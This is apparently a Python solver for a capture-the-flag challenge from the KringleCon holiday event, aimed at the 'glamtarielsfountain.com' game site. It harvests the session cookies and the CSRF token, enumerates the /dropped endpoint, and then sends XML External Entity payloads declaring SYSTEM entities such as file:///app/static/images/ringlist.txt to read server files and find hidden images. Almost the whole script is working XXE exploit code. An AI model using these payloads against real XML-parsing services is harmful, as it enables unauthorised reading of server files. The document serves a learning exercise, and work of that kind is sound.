import requests
import json
from bs4 import BeautifulSoup
import os
path = os.path.abspath(os.getcwd())
print("Starting the Challenge....")
print ("-----------------------------------------------")
burp_url = "https://glamtarielsfountain.com"
initial = requests.get(burp_url)
GCLB = initial.cookies['GCLB']
MiniLembanh = initial.cookies['MiniLembanh']
soup = BeautifulSoup(initial.text, 'html.parser')
Grinchum = soup.find(id='csrf').attrs['content']
x = 0
y = 0 
img = ['img1', 'img2','img3','img4']
character = ['princess','fountain', 'none']
burp0_url = "https://glamtarielsfountain.com:443/dropped"
burp0_cookies = {"GCLB": GCLB, "MiniLembanh": MiniLembanh }
burp0_headers = {"Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", "Accept": "application/json", "Content-Type": "application/json", "X-Grinchum": Grinchum, "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://glamtarielsfountain.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://glamtarielsfountain.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
print("Starting to TEMPER with the Dropped function....")
print ("-----------------------------------------------")
for y in range(0,len(character)):
    
    for x in range(0,len(img)):
    
        burp0_json={"imgDrop": img[x], "reqType": "json", "who": character[y]}
        n = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
        

        output = json.loads(n.content.decode("utf-8"))

        print (str("WHO: ") + character[y] + str(' - ') + str("imgDROP: ") + img[x] + str (' - ') + str("RESPONSE: ") + output['appResp'])
print ("-----------------------------------------------")
print("TEMPERING COOKIES NOW TO INCLUDE THE DOMAIN AND PATH COOKIES....GETTING MORE RESPONSES")
print ("-----------------------------------------------")
for time in range (0,2):
    img1 = ['img1', 'img2','img3','img4', 'img5']
    burp1_url = "https://glamtarielsfountain.com:443/dropped"
    burp1_cookies = {"GCLB": GCLB, "MiniLembanh": MiniLembanh, "Domain":"glamtarielsfountain.com", "Path":"/" }
    burp1_headers = {"Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", "Accept": "application/json", "Content-Type": "application/json", "X-Grinchum": Grinchum, "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://glamtarielsfountain.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://glamtarielsfountain.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}

    for b in range(0,len(character)):
    
        for a in range(0,len(img1)):
    
            burp1_json={"imgDrop": img1[a], "reqType": "json", "who": character[b]}
            n2 = requests.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, json=burp1_json)
        

            output2 = json.loads(n2.content.decode("utf-8"))

            print (str("WHO: ") + character[b] + str(' - ') + str("RESPONSE: ") + output2['appResp']+ str('- VISIT: ') +  output2['visit'])
    print ("-----------------------------------------------")
    print("REGENERATING THE REQUEST AGAIN...")
print ("-----------------------------------------------")

print("GETTING RINGLIST...")
burp2_url = "https://glamtarielsfountain.com:443/dropped"
burp2_cookies = {"GCLB": GCLB, "MiniLembanh": MiniLembanh, "Domain":"glamtarielsfountain.com", "Path":"/" }
burp2_headers = {"Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", "Accept": "application/xml", "Content-Type": "application/xml", "X-Grinchum": Grinchum, "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://glamtarielsfountain.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://glamtarielsfountain.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
burp2_data = "<?xml version=\"1.0\" ?><!DOCTYPE imgDrop [<!ENTITY img1 SYSTEM \"file:///app/static/images/ringlist.txt\" >]>\r\n<foo>\r\n<imgDrop>&img1;</imgDrop>\r\n<who>princess</who><reqType>xml</reqType>\r\n</foo>\r\n"
n3 = requests.post(burp2_url, headers=burp2_headers, cookies=burp2_cookies, data=burp2_data)
output3 = json.loads(n3.content.decode("utf-8"))
print (str("WHO: ") + character[0] + str(' - ') + str("RESPONSE: ") + output3['appResp']+ str('- VISIT: ') +  output3['visit'])



burp3_url = "https://glamtarielsfountain.com:443/static/images/pholder-morethantopsupersecret63842.png"
burp2_cookies = {"GCLB": GCLB, "MiniLembanh": MiniLembanh, "Path":"/" }
burp3_headers = {"Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\""}
response = requests.get(burp3_url, headers=burp3_headers, cookies=burp2_cookies)
if response.status_code:
    fp = open(path + '\\RINGLIST.PNG', 'wb')
    fp.write(response.content)
    fp.close()
print('Ringlist saved as ' + path + '\\RINGLIST.PNG')
print ("-----------------------------------------------")
print('GETTING EASTER EGG')
burp4_data = "<?xml version=\"1.0\" ?><!DOCTYPE imgDrop [<!ENTITY img1 SYSTEM \"file:///app/static/images/x_phial_pholder_2022/greenring.txt\" >]>\r\n<foo>\r\n<imgDrop>&img1;</imgDrop>\r\n<who>princess</who><reqType>xml</reqType>\r\n</foo>\r\n"
n4 = requests.post(burp2_url, headers=burp2_headers, cookies=burp1_cookies, data=burp4_data)
output4  = json.loads(n4.content.decode("utf-8"))
print (str("WHO: ") + character[0] + str(' - ') + str("RESPONSE: ") + output4['appResp']+ str('- VISIT: ') +  output4['visit'])

greenring_url = "https://glamtarielsfountain.com:443/static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png"
response = requests.get(greenring_url, headers=burp3_headers, cookies=burp2_cookies)
if response.status_code:
    fp = open('C:\\Users\\hung2\\Downloads\\kringlecon\\easteregg.PNG', 'wb')
    fp.write(response.content)
    fp.close()
print('EasterEgg saved as CC:\\Users\\hung2\\Downloads\\kringlecon\\easteregg.PNG')
print ("-----------------------------------------------")
print('GETTING RINGS')
Message = ['GETTING RED RING....', 'GETTING BLUE RING....', 'GETTING SILVER RING....',  'GETTING GOLD  RING...'] 
for time in range (0,4):
    red_data = "<?xml version=\"1.0\" ?><!DOCTYPE imgDrop [<!ENTITY img1 SYSTEM \"file:///app/static/images/x_phial_pholder_2022/redring.txt\" >]>\r\n<foo>\r\n<imgDrop>&img1;</imgDrop>\r\n<who>princess</who><reqType>xml</reqType>\r\n</foo>\r\n"
    blue_data = "<?xml version=\"1.0\" ?><!DOCTYPE imgDrop [<!ENTITY img1 SYSTEM \"file:///app/static/images/x_phial_pholder_2022/bluering.txt\" >]>\r\n<foo>\r\n<imgDrop>&img1;</imgDrop>\r\n<who>princess</who><reqType>xml</reqType>\r\n</foo>\r\n"
    silver_data = "<?xml version=\"1.0\" ?><!DOCTYPE imgDrop [<!ENTITY img1 SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\" >]>\r\n<foo>\r\n<imgDrop>&img1;</imgDrop>\r\n<who>princess</who><reqType>xml</reqType>\r\n</foo>\r\n"
    gold_data = "<?xml version=\"1.0\" ?><!DOCTYPE imgDrop [<!ENTITY img1 SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\" >]>\r\n<foo>\r\n<imgDrop>&img1;</imgDrop>\r\n<who>princess</who><reqType>xml</reqType>\r\n</foo>\r\n"
    ring_list = [red_data, blue_data, silver_data, gold_data]
    ring_output = json.loads(requests.post(burp2_url, headers=burp2_headers, cookies=burp1_cookies, data=ring_list[time]).content.decode("utf-8"))
    print (Message[time] + str(' - ') + str("RESPONSE: ") + ring_output['appResp']+ str('- VISIT: ') +  ring_output['visit'])
    if time ==  2:
        silver_url = "https://glamtarielsfountain.com:443/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png"
        response = requests.get(silver_url, headers=burp3_headers, cookies=burp2_cookies)
        if response.status_code:
              fp = open(path + '\\SILVERRING.PNG', 'wb')
              fp.write(response.content)
              fp.close()
              print('Silver Ring saved as ' + path + '\\SILVERRING.PNG')
print ("-----------------------------------------------")
print('WITH HINTS FROM SILVER RING. GET THE GOLD RING AGAIN....')
gold_data = "<?xml version=\"1.0\" ?><!DOCTYPE reqType [<!ENTITY xml SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\" >]>\r\n<foo>\r\n<imgDrop>img1</imgDrop>\r\n<who>princess</who><reqType>&xml;</reqType>\r\n</foo>\r\n"
ring_output = json.loads(requests.post(burp2_url, headers=burp2_headers, cookies=burp1_cookies, data=gold_data).content.decode("utf-8"))
print ('GETTING GOLD RING RESPONSE' + str(' - ') + str("RESPONSE: ") + ring_output['appResp']+ str('- VISIT: ') +  ring_output['visit'])
print ('SAVING the GOLD RING NOW.....')
final_url = "https://glamtarielsfountain.com:443/static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png"
response = requests.get(final_url, headers=burp3_headers, cookies=burp2_cookies)
if response.status_code:
    fp = open(path + '\\goldring-morethansupertopsecret76394734.png', 'wb')
    fp.write(response.content)
    fp.close()
    print('GOLD Ring saved as ' + path + '\\goldring-morethansupertopsecret76394734.png')
print ("-----------------------------------------------")    
print ('CHALLENGE COMPLETED....ANSWER:goldring-morethansupertopsecret76394734.png')
print ("-----------------------------------------------")
print ('If you want to test it using Burp again. Here are the web parameters used:')
print ("GCLB: " + GCLB)
print("MiniLembanh: " + MiniLembanh)
print("X-Grinchum: " + Grinchum)
